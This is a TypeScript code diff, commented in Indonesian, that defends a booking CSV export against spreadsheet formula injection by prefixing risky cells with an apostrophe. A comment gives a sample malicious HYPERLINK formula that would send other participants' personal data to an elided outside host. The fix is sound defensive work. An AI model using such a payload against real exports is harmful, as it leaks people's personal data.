@@ -25,9 +25,30 @@ function getUser(booking: ExportBooking) {
   return booking.users
 }
 
+// Karakter yang bikin Excel/LibreOffice/Sheets menafsirkan isi cell sebagai
+// rumus, bukan teks. Tanda kutip CSV TIDAK melindungi dari ini — quote-nya
+// dibuang saat import, lalu isinya dievaluasi.
+const AWALAN_RUMUS = /^[=+\-@\t\r]/
+
 function escapeCsvCell(value: string | number | null | undefined) {
   const text = value === null || value === undefined ? '' : String(value)
-  return `"${text.replaceAll('"', '""')}"`
+
+  // `nama`, `no_hp`, `profesi`, dan `domisili` diisi sendiri oleh peserta saat
+  // register tanpa batasan format. Tanpa netralisasi ini, peserta yang
+  // mendaftar dengan nama `=HYPERLINK("https://.../?x="&A2&B2,"klik")` bisa
+  // menarik PII peserta lain begitu admin membuka export di Excel.
+  //
+  // Awalan `'` memaksa spreadsheet membaca cell sebagai teks. Untuk no_hp
+  // bentuk `+62812...` itu menguntungkan — tanda `+` jadi ikut terbaca, bukan
+  // dievaluasi jadi angka.
+  //
+  // Yang BELUM tertangani di sini: no_hp bentuk `08123...` tidak diawali
+  // karakter rumus, jadi tidak di-prefix, dan Excel masih membuang nol di
+  // depannya. Itu masalah fidelitas data yang terpisah dari injeksi rumus —
+  // perlu keputusan sendiri apakah kolom no_hp dipaksa teks selalu.
+  const aman = AWALAN_RUMUS.test(text) ? `'${text}` : text
+
+  return `"${aman.replaceAll('"', '""')}"`
 }
 
 function toCsv(rows: Array<Array<string | number | null | undefined>>) {
